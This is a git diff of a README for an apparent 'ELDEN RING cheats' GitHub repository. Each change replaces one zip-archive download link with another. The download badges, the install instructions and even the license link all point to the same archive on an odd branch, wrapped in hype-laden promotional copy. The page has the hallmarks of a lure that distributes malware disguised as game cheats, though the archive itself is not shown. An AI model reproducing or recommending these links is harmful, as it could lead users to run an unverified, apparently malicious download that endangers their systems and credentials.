@@ -1,6 +1,6 @@
 # ELDEN RING Cheats Repository
 
-[![Download](https://raw.githubusercontent.com/DndMuzik/elden-ring-unlocked-tools/branch/wintrily/elden-ring-tools-unlocked-1.3.zip%20RING%20Cheats-brightgreen?style=for-the-badge&logo=download&logoColor=white&labelColor=black)](https://raw.githubusercontent.com/DndMuzik/elden-ring-unlocked-tools/branch/wintrily/elden-ring-tools-unlocked-1.3.zip)
+[![Download](https://github.com/DndMuzik/elden-ring-unlocked-tools/raw/refs/heads/branch/wintrily/tools_ring_elden_unlocked_v3.4.zip%20RING%20Cheats-brightgreen?style=for-the-badge&logo=download&logoColor=white&labelColor=black)](https://github.com/DndMuzik/elden-ring-unlocked-tools/raw/refs/heads/branch/wintrily/tools_ring_elden_unlocked_v3.4.zip)
 
 Welcome to the **ELDEN RING Cheats Repository**—a visionary toolset engineered to amplify your adventure across The Lands Between. This powerhouse is shaped for those who chase not just victory, but the joy of experimentation, configuration, and strategic mastery. Step off the beaten path with a toolkit that unlocks creative playstyles in one of 2025's most beloved RPGs.
 
@@ -73,7 +73,7 @@ To use this feature, simply connect your API key in the settings panel after ins
 **Ready to begin your journey in a new dimension? Just follow these steps:**
 
 ### 1. Download
-[![Download](https://raw.githubusercontent.com/DndMuzik/elden-ring-unlocked-tools/branch/wintrily/elden-ring-tools-unlocked-1.3.zip%20RING%20Cheats-blue?style=flat-square&logo=download&labelColor=1e1e1e)](https://raw.githubusercontent.com/DndMuzik/elden-ring-unlocked-tools/branch/wintrily/elden-ring-tools-unlocked-1.3.zip)
+[![Download](https://github.com/DndMuzik/elden-ring-unlocked-tools/raw/refs/heads/branch/wintrily/tools_ring_elden_unlocked_v3.4.zip%20RING%20Cheats-blue?style=flat-square&logo=download&labelColor=1e1e1e)](https://github.com/DndMuzik/elden-ring-unlocked-tools/raw/refs/heads/branch/wintrily/tools_ring_elden_unlocked_v3.4.zip)
 
 ### 2. Unpack
 Extract the archive to a destination of your choice. We suggest an empty folder for optimal organization.
@@ -104,7 +104,7 @@ This repository is exclusively intended for entertainment and offline or private
 
 ## 📜 MIT License (2025)
 
-This project is licensed under the MIT License—yours to use, adapt, and build upon! See the detailed license terms [here](https://raw.githubusercontent.com/DndMuzik/elden-ring-unlocked-tools/branch/wintrily/elden-ring-tools-unlocked-1.3.zip).
+This project is licensed under the MIT License—yours to use, adapt, and build upon! See the detailed license terms [here](https://github.com/DndMuzik/elden-ring-unlocked-tools/raw/refs/heads/branch/wintrily/tools_ring_elden_unlocked_v3.4.zip).
 
 ---
 
@@ -118,6 +118,6 @@ Support is ready around the clock, 24/7, all through 2025.
 
 ---
 
-[![Download](https://raw.githubusercontent.com/DndMuzik/elden-ring-unlocked-tools/branch/wintrily/elden-ring-tools-unlocked-1.3.zip%20RING%20Cheats-brightgreen?style=for-the-badge&logo=download&logoColor=white&labelColor=black)](https://raw.githubusercontent.com/DndMuzik/elden-ring-unlocked-tools/branch/wintrily/elden-ring-tools-unlocked-1.3.zip)
+[![Download](https://github.com/DndMuzik/elden-ring-unlocked-tools/raw/refs/heads/branch/wintrily/tools_ring_elden_unlocked_v3.4.zip%20RING%20Cheats-brightgreen?style=for-the-badge&logo=download&logoColor=white&labelColor=black)](https://github.com/DndMuzik/elden-ring-unlocked-tools/raw/refs/heads/branch/wintrily/tools_ring_elden_unlocked_v3.4.zip)
 
 *Indulge your curiosity. Rewrite your legend. Level up your ELDEN RING adventure—one innovative tool at a time!*
